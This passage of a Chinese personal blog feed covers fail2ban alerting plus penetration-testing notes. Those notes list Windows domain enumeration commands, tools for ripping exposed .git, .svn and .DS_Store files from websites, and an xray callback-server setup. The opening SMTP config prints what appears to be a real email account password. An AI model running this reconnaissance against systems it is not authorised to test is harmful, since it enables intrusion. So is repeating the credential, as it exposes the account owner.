smtp-auth-user=741474596@qq.comset smtp-auth-password=gkotyjhergynbdjh     set smtp-auth=login #启用ssl加密set smtp-user-starttls                                          set ssl-verify=ignore#ssl的加密证书set nss-config-dir=/etc/ssl/certs EOF# 测试发送邮件echo &quot;邮件内容&quot; |mail -v -s &quot;邮件标题&quot; xxx@xxx.commail -s &quot;theme&quot; xx@xxx.com &lt; message.txt</code></pre><p>Fail2ban可以在IP被禁止时发送电子邮件警报。 要接收电子邮件，您需要在服务器上安装SMTP并更改默认的action，该action操作仅将IP禁止为<code>%(action_mw)s</code>，如下所示：</p><pre><code># /etc/fail2ban/jail.localaction = %(action_mw)s</code></pre><p><code>%(action_mw)s</code>将禁止有问题的IP，并发送包含Whois报告的电子邮件。 如果要在电子邮件中包含相关日志，请将操作设置为<code>%(action_mwl)s</code>。您还可以调整发送和接收电子邮件地址：</p><pre><code># /etc/fail2ban/jail.localdestemail = admin@myfreax.comsender = root@myfreax.com</code></pre><h3 id="配置Fail2ban-telegram-机器人通知"><a href="#配置Fail2ban-telegram-机器人通知" class="headerlink" title="配置Fail2ban telegram 机器人通知"></a>配置Fail2ban telegram 机器人通知</h3><pre><code class="bash">#创建Telegram 机器人为关注`Botfather`，按提示操作即可，#可查找机器人Token，添加`userinfobot`查找自己聊天ID#在/etc/fail2ban/action.d/中新建telegram.conf文件并写入[Definition]actionstart = /etc/fail2ban/scripts/send_telegram_notif.sh -a startactionstop = /etc/fail2ban/scripts/send_telegram_notif.sh -a stopactioncheck =actionban = /etc/fail2ban/scripts/send_telegram_notif.sh -n &lt;name&gt; -b &lt;ip&gt;actionunban = /etc/fail2ban/scripts/send_telegram_notif.sh -n &lt;name&gt; -u &lt;ip&gt;[Init]init = 123``````bash#在/etc/fail2ban/中新建scripts目录，并新增send_telegram_notif.sh脚本文件写入#!/bin/bash# Version 1.0# Send Fail2ban notifications using a Telegram Bot# Add to the /etc/fail2ban/jail.conf:# [sshd]# ***# action  = iptables[name=SSH, port=22, protocol=tcp]#                       telegram# Create a new file in /etc/fail2ban/action.d with the following information:# [Definition]# actionstart = /etc/fail2ban/scripts/send_telegram_notif.sh -a start# actionstop = /etc/fail2ban/scripts/send_telegram_notif.sh -a stop# actioncheck =# actionban = /etc/fail2ban/scripts/send_telegram_notif.sh -n &lt;name&gt; -b &lt;ip&gt;# actionunban = /etc/fail2ban/scripts/send_telegram_notif.sh -n &lt;name&gt; -u &lt;ip&gt;## [Init]# init = 123# Telegram BOT TokentelegramBotToken=&#39;xxxxx&#39; #此处替换为自己Telegram 机器人Token# Telegram Chat IDtelegramChatID=&#39;xxxxx&#39;#此处替换为自己的Chat IDfunction talkToBot() &#123;        message=$1        curl -s -X POST https://api.telegram.org/bot$&#123;telegramBotToken&#125;/sendMessage -d text=&quot;$&#123;message&#125;&quot;-d chat_id=$&#123;telegramChatID&#125; &gt; /dev/null 2&gt;&amp;1&#125;if[ $# -eq 0 ]; then        echo &quot;Usage $0 -a ( start || stop ) || -b $IP || -u $IP&quot;        exit 1;fiwhile getopts &quot;a:n:b:u:&quot; opt; docase&quot;$opt&quot;in                a)                        action=$OPTARG;;                n)                        jail_name=$OPTARG;;                b)                        ban=y                        ip_add_ban=$OPTARG;;                u)                        unban=y                        ip_add_unban=$OPTARG;;                ?)                        echo &quot;Invalid option. -$OPTARG&quot;                        exit 1;;esacdoneif[[ ! -z $&#123;action&#125; ]]; thencase&quot;$&#123;action&#125;&quot;in                start)                        talkToBot &quot;Fail2ban has been started on `hostname`.&quot;;;                stop)                        talkToBot &quot;Fail2ban has been stopped on `hostname`.&quot;;;*)                        echo &quot;Incorrect option&quot;                        exit 1;;;esacelif[[ $&#123;ban&#125; == &quot;y&quot;]]; then        talkToBot &quot;[$&#123;jail_name&#125;] The IP: $&#123;ip_add_ban&#125; has been banned on `hostname`.&quot;        exit 0;elif[[ $&#123;unban&#125; == &quot;y&quot;]]; then        talkToBot &quot;[$&#123;jail_name&#125;] The IP: $&#123;ip_add_unban&#125; has been unbanned on `hostname`.&quot;        exit 0;else        infofi</code></pre><pre><code class="bash">#给send_telegram_notif.sh脚本添加可执行权限chmod +x send_telegram_notif.sh#修改jail.local配置文件，将启用的jail的action下添加一个telegram，如下action  = iptables[name=SSH,port=2202,protocol=tcp]            telegram#重启fail2ban验证systemctl restart fail2ban</code></pre><p>Telegram 机器人告警通知效果如图<br><img src="https://devops.chat/wp-content/uploads/2021/09/88d658795fad1c4_1_post.png"></p><h2 id="激活fail2ban"><a href="#激活fail2ban" class="headerlink" title="激活fail2ban"></a>激活fail2ban</h2><pre><code class="shell">systemctl restart fail2banservice fail2ban restart</code></pre><h2 id="检测生效脚本"><a href="#检测生效脚本" class="headerlink" title="检测生效脚本"></a>检测生效脚本</h2><pre><code class="shell">#!/bin/bashfor ((i=1;i&lt;=50;i++)); docurl -H &quot;Fail2ban test&quot; https://your-domian/test &gt; /dev/null 2&gt;&amp;1doneecho &quot;done&quot;```# 使用Fail2ban客户端`fail2ban-client &lt;COMMAND&gt;`以下是 Fail2ban-client 命令列表：-   `start`: 用于启动fail2ban服务器和jails-   `reload`: 用于重新加载 Fail2ban 配置-   `stop`: 停止服务器-   `status`: 用于检查服务器状态并启用 jails-   `status JAIL` : 显示监狱的状态和当前被禁止的 IP## 查看所有命令```shellfail2ban-client -help</code></pre><h2 id="检查启动状态"><a href="#检查启动状态" class="headerlink" title="检查启动状态"></a>检查启动状态</h2><pre><code class="shell">fail2ban-client ping   # 正确启动的话fail2ban会以pong作为回应(Server replied: pong)sudo fail2ban-client version #查看 Fai2ban 的版本sudo fail2ban-client ping #检查 Fail2ban 是否正常运行（正常将显示 pong）sudo systemctl start fail2ban #启动 Fail2bansudo systemctl stop fail2ban #停止 Fail2bansudo systemctl restart fail2ban #重启 Fail2bansudo tail -f /var/log/fail2ban.log #打开 Fail2ban 的日志监控sudo iptables --list -n #显示系统当前 iptablessudo iptables -D INPUT -s xxx.xxx.xxx.xxx -j DROP #解除封禁的 IP</code></pre><h2 id="查看指定-Jail-规则下被封禁的IP情况"><a href="#查看指定-Jail-规则下被封禁的IP情况" class="headerlink" title="查看指定 Jail 规则下被封禁的IP情况"></a>查看指定 Jail 规则下被封禁的IP情况</h2><pre><code class="shell">fail2ban-client status [jailname]</code></pre><h2 id="封禁-解封限制IP"><a href="#封禁-解封限制IP" class="headerlink" title="封禁/解封限制IP"></a>封禁/解封限制IP</h2><p><code>sudo fail2ban-client set &lt;jailname&gt; banip/unbanip &lt;IP&gt;</code></p><pre><code class="shell">sudo fail2ban-client set sshd banip 23.34.45.56sudo fail2ban-client set sshd unbanip 23.34.45.56</code></pre><h2 id="添加-解除指定IP的忽略"><a href="#添加-解除指定IP的忽略" class="headerlink" title="添加/解除指定IP的忽略"></a>添加/解除指定IP的忽略</h2><pre><code class="shell">fail2ban-client set &lt;JAIL&gt; addignoreip/delignoreip &lt;IP&gt;</code></pre><h2 id="验证自定义规则"><a href="#验证自定义规则" class="headerlink" title="验证自定义规则"></a>验证自定义规则</h2><pre><code class="bash">fail2ban-regex [OPTIONS] &lt;LOG&gt; &lt;REGEX&gt; [IGNOREREGEX]</code></pre><ul><li><code>LOG</code>为需要匹配的日志文件路径，</li><li><code>REGEX</code>为正则表达式所在的文件路径(通常位于<code>filter.d</code>文件夹内)</li></ul><p>以下为常用的<code>OPTIONS</code></p><pre><code class="bash">// Do not print any missed lines--print-no-missed// Do not print any ignored lines--print-no-ignored// Print all matched lines--print-all-matched// Print all missed lines, no matter how many--print-all-missed// Print all ignored lines, no matter how many--print-all-ignored</code></pre><h2 id="查看fail2ban的日志"><a href="#查看fail2ban的日志" class="headerlink" title="查看fail2ban的日志"></a>查看fail2ban的日志</h2><pre><code class="shell">tail -f /var/log/fail2ban.log</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Fail2ban&quot;&gt;&lt;a href=&quot;#Fail2ban&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>密码管理方案的研究和搭建</title>
    <link href="https://askding.github.io/Tools/%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86%E6%96%B9%E6%A1%88%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%90%AD%E5%BB%BA.html"/>
    <id>https://askding.github.io/Tools/%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86%E6%96%B9%E6%A1%88%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%90%AD%E5%BB%BA.html</id>
    <published>2022-05-18T02:43:40.000Z</published>
    <updated>2022-05-18T02:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none"></div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;script src=/js/crypto-js.js&gt;&lt;/script&gt;
&lt;script&gt;
function doDecrypt (pwd, onError) {
	console.log(&#39;in doDecrypt&#39;);
	const txt = document.getE</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>关于域信息收集</title>
    <link href="https://askding.github.io/Tools/%E5%85%B3%E4%BA%8E%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
    <id>https://askding.github.io/Tools/%E5%85%B3%E4%BA%8E%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</id>
    <published>2022-04-27T13:50:54.000Z</published>
    <updated>2022-04-27T13:50:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#orgd21826a">DC</a><ol><li> <a href="#org1625edc">net类命令</a></li><li> <a href="#org6024d02">查看当前用户权限及SID</a></li><li><a href="#org5c9d637">查看是否存在域</a><ol><li> <a href="#org96be934">systeminfo判断</a></li><li> <a href="#orgeb67873"><code>net time /domain</code> 判断</a></li><li> <a href="#org2070906"><code>net config workstation</code> 判断</a></li></ol></li></ol></li><li><a href="#org06320c0">探测存活主机</a><ol><li> <a href="#orgcbed0df">利用ICMP协议探测</a></li></ol></li></ol><p><a id="orgd21826a"></a></p><h1 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h1><p>dns一般为域控，并且域控会开启389端口（LDAP服务）</p><p><a id="org1625edc"></a></p><h2 id="net类命令"><a href="#net类命令" class="headerlink" title="net类命令"></a>net类命令</h2><pre><code>net accounts                               # 查看本地密码策略net accounts /domain                       # 查看域密码策略net user                                   # 查看本机有哪些用户net user /domain                           # 查看当前域中所有域用户net user &lt;account-name&gt; /domain            # 查看域用户登陆时间，密码过期时间，是否有登陆脚本，所属组net time  /domain                          # 查看域时间net localgroup administrators              # 查看本机管理员账户net localgroup administrators /domain      # 查看登陆本机的域管理员账户net group /domain                          # 查看域内所有的组账户net group &quot;domain admins&quot;  /domain         # 查看域管理员用户组及成员net group &quot;domain controllers&quot;  /domain    # 查看域控列表nslookup -type=SRV _ldap._tcp.dc._msdcs.gpgc.local    # 定位域控主机名net group &quot;domain computers&quot; /domain       # 查看所有域成员计算机列表net view  /domain:gpgc.local               # 查看指定域列表nltest /domain_trusts                      # 获取域信任信息nltest /dclist:xxzx.gpgc.local             # 查看域控cmdkey /l                                     # 是否保存了登录凭证rout print                                 # 打印当前路由信息netstat -ant                               # 查看网络连接情况</code></pre><p><a id="org6024d02"></a></p><h2 id="查看当前用户权限及SID"><a href="#查看当前用户权限及SID" class="headerlink" title="查看当前用户权限及SID"></a>查看当前用户权限及SID</h2><pre><code>whoami /all用户信息----------------用户名                SID                                           ===================== ==============================================ethanhunter78bc\ethan S-1-5-21-4157029122-2371177861-4132612220-1000</code></pre><p><a id="org5c9d637"></a></p><h2 id="查看是否存在域"><a href="#查看是否存在域" class="headerlink" title="查看是否存在域"></a>查看是否存在域</h2><p><a id="org96be934"></a></p><h3 id="systeminfo判断"><a href="#systeminfo判断" class="headerlink" title="systeminfo判断"></a>systeminfo判断</h3><p>systeminfo系统信息中含有两项：Domain和Logon Server，前者为域名，后者为域控。倘若Domain为Workgroup则当前服务器不在域内</p><pre><code>systeminfo | findstr &quot;\.&quot;OS 版本:          10.0.19042 暂缺 Build 19042系统制造商:       Parallels Software International Inc.BIOS 版本:        Parallels Software International Inc. 16.1.2 (49151), 2020/12/18页面文件位置:     C:\pagefile.sys域：             xxzx.example.local                    ---&gt; 当前所在域                        DHCP 服务器: 10.147.11.71       ---&gt; DNS服务器地址                        [01]: 10.122.166.103           ---&gt; 本机地址</code></pre><p><a id="orgeb67873"></a></p><h3 id="net-time-domain-判断"><a href="#net-time-domain-判断" class="headerlink" title="net time /domain 判断"></a><code>net time /domain</code> 判断</h3><ul><li><p>  如果存在域会从域控返回时间， 并在第一行返回域控及域名</p></li><li><p>  如果当前服务器在域内但是当前用户非域用户，则会返回System error 5就表示权限不够</p></li><li><p>返回找不到域Workgroup的域控制器表示当前网络环境为工作组</p><p>  net time /domain</p></li></ul><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20210609155122windows.png" alt="img"></p><p><a id="org2070906"></a></p><h3 id="net-config-workstation-判断"><a href="#net-config-workstation-判断" class="headerlink" title="net config workstation 判断"></a><code>net config workstation</code> 判断</h3><p>其中工作域显示域名，同样若为WORKGROUP则非域环境，登录域表明当前用户是域用户登录还是本地用户登录</p><pre><code>net config workstation计算机名                     \\ETHANHUNTER78BC计算机全名                   ETHANHUNTER78BC用户名                       ethan工作站正运行于                   NetBT_Tcpip_&#123;0329A0F2-ADD9-4358-93A2-CC710202AAEF&#125; (001C42EB757D)软件版本                     Windows 10 Pro for Workstations工作站域                     XXZX //WORKGROUP为不在域内工作站域DNS名称               xxzx.example.local登录域                       XXZX     // 表面当前用户是域用户</code></pre><p><a id="org06320c0"></a></p><h1 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h1><p><a id="orgcbed0df"></a></p><h2 id="利用ICMP协议探测"><a href="#利用ICMP协议探测" class="headerlink" title="利用ICMP协议探测"></a>利用ICMP协议探测</h2><pre><code>for /L %I in (1,1,254) do @ping -w 1 -n 1 10.122.166.%I | findstr &quot;TTL=&quot;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>关于web目标的信息收集</title>
    <link href="https://askding.github.io/Tools/%E5%85%B3%E4%BA%8Eweb%E7%9B%AE%E6%A0%87%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
    <id>https://askding.github.io/Tools/%E5%85%B3%E4%BA%8Eweb%E7%9B%AE%E6%A0%87%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</id>
    <published>2022-04-26T13:49:32.000Z</published>
    <updated>2022-04-26T13:49:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org075cfdf">敏感文件</a><ol><li><a href="#orgf8dd7ec">源代码  dvcs-ripper</a><ol><li> <a href="#org0f91b54">.git目录 <code>.git/config</code> 存在，漏洞存在</a></li><li> <a href="#org90cfaa2">.svn目录  <code>wc.db</code> 文件存在，漏洞存在</a></li><li> <a href="#org1207872">HG文件泄露</a></li><li> <a href="#orgaee4e71">.DS<sub>Store文件</sub>  ds<sub>store</sub><sub>exp</sub></a></li><li> <a href="#org4a16284">WEB-INF/web.xml文件</a></li></ol></li><li><a href="#orgc6edac3">备份文件</a><ol><li> <a href="#orgb46d623">网站源码备份</a></li><li> <a href="#org67c723d">gedit备份文件</a></li><li> <a href="#org400b25e">vim备份文件</a></li><li> <a href="#org05b69f5">emacs备份文件</a></li></ol></li><li> <a href="#org8a78407">常规文件</a></li><li> <a href="#org0f0b5da">fofa信息js脚本采集</a></li></ol></li><li> <a href="#org2c32552">CMS中间件 wappalyzer</a></li></ol><p><a id="org075cfdf"></a></p><h1 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h1><p><a id="orgf8dd7ec"></a></p><h2 id="源代码-dvcs-ripper"><a href="#源代码-dvcs-ripper" class="headerlink" title="源代码  dvcs-ripper"></a>源代码  <a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></h2><p><a id="org0f91b54"></a></p><h3 id="git目录-git-config-存在，漏洞存在"><a href="#git目录-git-config-存在，漏洞存在" class="headerlink" title=".git目录 .git/config 存在，漏洞存在"></a>.git目录 <code>.git/config</code> 存在，漏洞存在</h3><ul><li><p>工具 <a href="https://github.com/denny0223/scrabble">scrabble</a></p><p>  bash scrabble <a href="http://www.example.com/">http://www.example.com/</a>      # make sure target has .git folder<br>  git reset–hard HEAD^                      # HEAD 代表当前版本   HEAD^代表上一个版本<br>  git log –stat                             # 查看显示当前的HEAD和它的祖先<br>  git diff HEAD <commit-id>                  # 比较<br>  git reflog                                  # 查看所有提交记录，包括分支</p></li><li><p>工具 <a href="https://github.com/lijiejie/GitHack">lijiejie-Githack</a>    <a href="https://github.com/WangYihang/GitHacker">Githacker</a></p><pre><code>  GitHack.py http://www.openssl.org/.git/    pip3 install GitHacker  githacker --url http://127.0.0.1/.git/ --folder result</code></pre></li></ul><p><a id="org90cfaa2"></a></p><h3 id="svn目录-wc-db-文件存在，漏洞存在"><a href="#svn目录-wc-db-文件存在，漏洞存在" class="headerlink" title=".svn目录  wc.db 文件存在，漏洞存在"></a>.svn目录  <code>wc.db</code> 文件存在，漏洞存在</h3><pre><code>rip-svn.pl -v -u http://www.example.com/.svn/</code></pre><p><a id="org1207872"></a></p><h3 id="HG文件泄露"><a href="#HG文件泄露" class="headerlink" title="HG文件泄露"></a>HG文件泄露</h3><p>hg init的时候会生成.hg</p><pre><code>rip-hg.pl -v -u http://www.example.com/.hg/</code></pre><p><a id="orgaee4e71"></a></p><h3 id="DSStore文件-dsstoreexp"><a href="#DSStore文件-dsstoreexp" class="headerlink" title=".DSStore文件  dsstoreexp"></a>.DS<sub>Store文件</sub>  <a href="https://github.com/lijiejie/ds_store_exp">ds<sub>store</sub><sub>exp</sub></a></h3><p>在发布代码时未删除文件夹中隐藏的.DS<sub>store</sub>，被发现后，获取了敏感的文件名等信息。</p><pre><code>python ds_store_exp.py http://www.example.com/.DS_Store</code></pre><p><a id="org4a16284"></a></p><h3 id="WEB-INF-web-xml文件"><a href="#WEB-INF-web-xml文件" class="headerlink" title="WEB-INF/web.xml文件"></a>WEB-INF/web.xml文件</h3><ul><li>  /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li>  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li><li>  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li>  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件</li><li>  /WEB-INF/database.properties：数据库配置文件</li></ul><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><p><a id="orgc6edac3"></a></p><h2 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h2><p><a id="orgb46d623"></a></p><h3 id="网站源码备份"><a href="#网站源码备份" class="headerlink" title="网站源码备份"></a>网站源码备份</h3><p><code>www.zip/rar/tar.gz</code> </p><p><a id="org67c723d"></a></p><h3 id="gedit备份文件"><a href="#gedit备份文件" class="headerlink" title="gedit备份文件"></a>gedit备份文件</h3><p><a id="org400b25e"></a></p><h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p><a id="org05b69f5"></a></p><h3 id="emacs备份文件"><a href="#emacs备份文件" class="headerlink" title="emacs备份文件"></a>emacs备份文件</h3><p><a id="org8a78407"></a></p><h2 id="常规文件"><a href="#常规文件" class="headerlink" title="常规文件"></a>常规文件</h2><pre><code>robotx.txtreadme.md</code></pre><p><a id="org0f0b5da"></a></p><h2 id="fofa信息js脚本采集"><a href="#fofa信息js脚本采集" class="headerlink" title="fofa信息js脚本采集"></a>fofa信息js脚本采集</h2><pre><code>document.querySelectorAll(&quot;.aSpan&quot;).forEach((node)=&gt;&#123;console.log(node.innerText);&#125;)</code></pre><p><a id="org2c32552"></a></p><h1 id="CMS中间件-wappalyzer"><a href="#CMS中间件-wappalyzer" class="headerlink" title="CMS中间件 wappalyzer"></a>CMS中间件 <a href="https://github.com/AliasIO/wappalyzer">wappalyzer</a></h1><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>xray配置反连平台</title>
    <link href="https://askding.github.io/Tools/xray%E9%85%8D%E7%BD%AE%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0.html"/>
    <id>https://askding.github.io/Tools/xray%E9%85%8D%E7%BD%AE%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0.html</id>
    <published>2022-04-24T13:47:17.000Z</published>
    <updated>2022-04-24T13:47:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org07ca632">xray独立反连平台配置</a><ol><li> <a href="#org19e459d">服务器端配置</a></li><li> <a href="#org224b658">客户端配置</a></li></ol></li></ol><p><a id="org07ca632"></a></p><h1 id="xray独立反连平台配置"><a href="#xray独立反连平台配置" class="headerlink" title="xray独立反连平台配置"></a>xray独立反连平台配置</h1><p>在 xray 中，反连平台默认不启用，因为这里面有些配置没有办法自动化，必须由人工配置完成才可使用。<br>需要反连平台才可以检测出来的漏洞包括但不限于：</p><ul><li>  ssrf</li><li>  fastjson</li><li>  s2-052</li><li>  xxe 盲打</li><li>  所有依赖反连平台的 poc</li></ul><p><a id="org19e459d"></a></p><h2 id="服务器端配置"><a href="#服务器端配置" class="headerlink" title="服务器端配置"></a>服务器端配置</h2><p>在vps上需配置 <code>config.yaml</code> 中 <strong>reverse</strong> 部分</p><pre><code># 服务端reverse:  db_file_path: &quot;reverse.db&quot;  token: &quot;please_change_me_to_a_new_token&quot;  http:    listen_ip: 0.0.0.0    listen_port: &quot;80&quot;</code></pre><p>执行如下命令</p><pre><code>./xray reverse</code></pre><p><a id="org224b658"></a></p><h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><p>在本地客户端的xray需配置 <code>config.yaml</code> 如下 <strong>reverse</strong> 部分</p><pre><code>reverse:  token: &quot;please_change_me_to_a_new_token&quot;  client:    remote_server: true    http_base_url: &quot;http://YOUR_REVERSE_SERVER_IP:80&quot;</code></pre><p>执行如下命令</p><pre><code>./xray_darwin_amd64 webscan --listen 127.0.0.1:7777  --html-output ~/Desktop/xray-report.html</code></pre><p>References:<br><a href="https://docs.xray.cool/#/scenario/burp">xray官方文档</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>关于区块链的认知</title>
    <link href="https://askding.github.io/Evolution/%E5%85%B3%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E8%AE%A4%E7%9F%A5.html"/>
    <id>https://askding.github.io/Evolution/%E5%85%B3%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E8%AE%A4%E7%9F%A5.html</id>
    <published>2022-04-22T13:34:13.000Z</published>
    <updated>2022-04-22T13:34:13.000Z</updated>
    
